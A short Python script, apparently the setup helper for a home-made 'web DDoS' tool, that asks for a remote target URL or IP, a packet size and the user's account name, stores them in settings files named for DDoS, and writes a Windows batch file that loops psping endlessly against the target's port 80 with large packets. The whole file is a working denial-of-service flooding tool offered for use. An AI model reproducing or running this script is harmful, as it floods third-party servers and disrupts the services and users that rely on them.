
pause = (input("Press 'Any key to continue'..."))
input_1 = (input("Enter a URL or IP ADDRESS(NOT LOCAL): "))
input_2 = (input("Input a packet size: "))
input_3 = (input("Input your computer ACCOUNT USER NAME: "))
val_1 = str(input_1)
val_2 = str(input_2)
val_3 = str(input_3)

with open('WEB_DDOS_C#_SETTINGS.txt', 'w') as write_file:
            write_file.write(val_1)
with open('CURRENT_USER.txt', 'w') as write_file:
            write_file.write(val_3)
            with open(f'C:/Users/{val_3}/Desktop/CODE SPACE/C# WPF/Ping_Web_C#/bin/Debug/net6.0/PSPing.bat', 'w') as write_file1:
                write_file1.write(":st\npsping -l "+val_2+"m -n 1 "+val_1+":80\ngoto :st")